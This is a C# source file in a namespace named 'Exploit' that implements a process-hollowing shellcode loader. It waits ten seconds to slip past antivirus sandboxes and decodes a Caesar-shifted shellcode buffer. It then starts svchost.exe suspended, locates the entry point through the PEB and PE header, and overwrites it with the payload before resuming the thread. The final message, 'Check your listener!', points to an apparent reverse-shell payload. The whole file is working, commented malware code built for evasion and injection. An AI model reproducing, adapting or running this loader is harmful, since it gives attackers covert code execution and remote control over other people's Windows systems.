using System;
using System.Runtime.InteropServices;

namespace Exploit
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            byte[] buf = new byte[] { 0x0d,0x59,0x94,0xf5,0x01,0xf9,0xdd,0x11,0x11,0x11,0x52,0x62,0x52,0x61,0x63,0x62,0x59,0x42,0xe3,0x67,0x76,0x59,0x9c,0x63,0x71,0x59,0x9c,0x63,0x29,0x59,0x9c,0x63,0x31,0x5e,0x42,0xda,0x59,0x9c,0x83,0x61,0x59,0x20,0xc8,0x5b,0x5b,0x59,0x42,0xd1,0xbd,0x4d,0x72,0x8d,0x13,0x3d,0x31,0x52,0xd2,0xda,0x1e,0x52,0x12,0xd2,0xf3,0xfe,0x63,0x59,0x9c,0x63,0x31,0x9c,0x53,0x4d,0x59,0x12,0xe1,0x77,0x92,0x89,0x29,0x1c,0x13,0x52,0x62,0x20,0x96,0x83,0x11,0x11,0x11,0x9c,0x91,0x99,0x11,0x11,0x11,0x59,0x96,0xd1,0x85,0x78,0x59,0x12,0xe1,0x55,0x9c,0x51,0x31,0x61,0x9c,0x59,0x29,0x5a,0x12,0xe1,0xf4,0x67,0x5e,0x42,0xda,0x59,0x10,0xda,0x52,0x9c,0x45,0x99,0x59,0x12,0xe7,0x59,0x42,0xd1,0xbd,0x52,0xd2,0xda,0x1e,0x52,0x12,0xd2,0x49,0xf1,0x86,0x02,0x5d,0x14,0x5d,0x35,0x19,0x56,0x4a,0xe2,0x86,0xe9,0x69,0x55,0x9c,0x51,0x35,0x5a,0x12,0xe1,0x77,0x52,0x9c,0x1d,0x59,0x55,0x9c,0x51,0x2d,0x5a,0x12,0xe1,0x52,0x9c,0x15,0x99,0x52,0x69,0x59,0x12,0xe1,0x52,0x69,0x6f,0x6a,0x6b,0x52,0x69,0x52,0x6a,0x52,0x6b,0x59,0x94,0xfd,0x31,0x52,0x63,0x10,0xf1,0x69,0x52,0x6a,0x6b,0x59,0x9c,0x23,0xfa,0x5c,0x10,0x10,0x10,0x6e,0x5a,0xcf,0x88,0x84,0x43,0x70,0x44,0x43,0x11,0x11,0x52,0x67,0x5a,0x9a,0xf7,0x59,0x92,0xfd,0xb1,0x12,0x11,0x11,0x5a,0x9a,0xf6,0x5a,0xcd,0x13,0x11,0x12,0xcc,0xd1,0xb9,0x42,0x5e,0x52,0x65,0x5a,0x9a,0xf5,0x5d,0x9a,0x02,0x52,0xcb,0x5d,0x88,0x37,0x18,0x10,0xe6,0x5d,0x9a,0xfb,0x79,0x12,0x12,0x11,0x11,0x6a,0x52,0xcb,0x3a,0x91,0x7c,0x11,0x10,0xe6,0x7b,0x1b,0x52,0x6f,0x61,0x61,0x5e,0x42,0xda,0x5e,0x42,0xd1,0x59,0x10,0xd1,0x59,0x9a,0xd3,0x59,0x10,0xd1,0x59,0x9a,0xd2,0x52,0xcb,0xfb,0x20,0xf0,0xf1,0x10,0xe6,0x59,0x9a,0xd8,0x7b,0x21,0x52,0x69,0x5d,0x9a,0xf3,0x59,0x9a,0x0a,0x52,0xcb,0xaa,0xb6,0x85,0x72,0x10,0xe6,0x96,0xd1,0x85,0x1b,0x5a,0x10,0xdf,0x86,0xf6,0xf9,0xa4,0x11,0x11,0x11,0x59,0x94,0xfd,0x21,0x59,0x9a,0xf3,0x5e,0x42,0xda,0x7b,0x15,0x52,0x69,0x59,0x9a,0x0a,0x52,0xcb,0x13,0xea,0xd9,0x70,0x10,0xe6,0x94,0x09,0x11,0x8f,0x66,0x59,0x94,0xd5,0x31,0x6f,0x9a,0x07,0x7b,0x51,0x52,0x6a,0x79,0x11,0x21,0x11,0x11,0x52,0x69,0x59,0x9a,0x03,0x59,0x42,0xda,0x52,0xcb,0x69,0xb5,0x64,0xf6,0x10,0xe6,0x59,0x9a,0xd4,0x5a,0x9a,0xd8,0x5e,0x42,0xda,0x5a,0x9a,0x01,0x59,0x9a,0xeb,0x59,0x9a,0x0a,0x52,0xcb,0x13,0xea,0xd9,0x70,0x10,0xe6,0x94,0x09,0x11,0x8e,0x39,0x69,0x52,0x68,0x6a,0x79,0x11,0x51,0x11,0x11,0x52,0x69,0x7b,0x11,0x6b,0x52,0xcb,0x1c,0x40,0x20,0x41,0x10,0xe6,0x68,0x6a,0x52,0xcb,0x86,0x7f,0x5e,0x72,0x10,0xe6,0x5a,0x10,0xdf,0xfa,0x4d,0x10,0x10,0x10,0x59,0x12,0xd4,0x59,0x3a,0xd7,0x59,0x96,0x07,0x86,0xc5,0x52,0x10,0xf8,0x69,0x7b,0x11,0x6a,0xcc,0xf1,0x2e,0x3b,0x1b,0x52,0x9a,0xeb,0x10,0xe6 };

            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");

            // 6. Decrypt Caesar Cipher Buffer
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint) buf[i] - 17) & 0xFF);
            }

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
        }
    }
}